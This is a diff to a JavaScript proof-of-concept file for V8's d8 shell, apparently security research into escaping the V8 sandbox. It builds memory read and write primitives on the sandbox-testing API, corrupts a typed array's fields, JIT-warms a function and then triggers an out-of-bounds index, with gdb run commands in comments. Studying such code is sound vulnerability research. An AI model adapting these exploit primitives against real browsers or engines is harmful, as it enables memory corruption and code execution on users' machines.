@@ -1,3 +1,6 @@
+// r --expose-gc --allow-natives-syntax --sandbox-testing --print-code  ~/v8_sb_fuzz/sandbox_fuzzer/a2.js
+// gdb --args /home/vult/v8_sb_fuzz/v8/out/debug/d8 --expose-gc --allow-natives-syntax --sandbox-testing --trace-turbo --print-code   ~/v8_sb_fuzz/sandbox_fuzzer/a2.js
+
 let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
 
 function addrOf(obj) {
@@ -26,24 +29,26 @@ function foo(obj,index, val) {
 }
 
 function test(iii,val) {
+  const a = 0xdeadbeef;
     return foo(u16arr, iii, val);
 }
 
 for (var i = 0; i < 0x10000; ++i) {
     test(1,0);
 }
+
+// %DebugPrint(test);
 // %DebugPrint(gsab);
-%DebugPrint(u16arr);
-console.log(addrOf(u16arr));
-console.log(v8_read64(addrOf(u16arr)+0x17));
+// %DebugPrint(u16arr);
+console.log(addrOf(u16arr).toString(16));
+console.log(v8_read64(addrOf(u16arr)+0x17).toString(16));
 
 v8_write64(addrOf(u16arr)+0x19,0x2e00000n);
 
-%DebugPrint(u16arr);
+// %DebugPrint(u16arr);
 let target = Number(0x20000000000n);
-%DebugPrint(target);
+// %DebugPrint(target);
 
 %SystemBreak();
 
-var ret = test(target,0);
-console.log(ret);
+test(target,0);
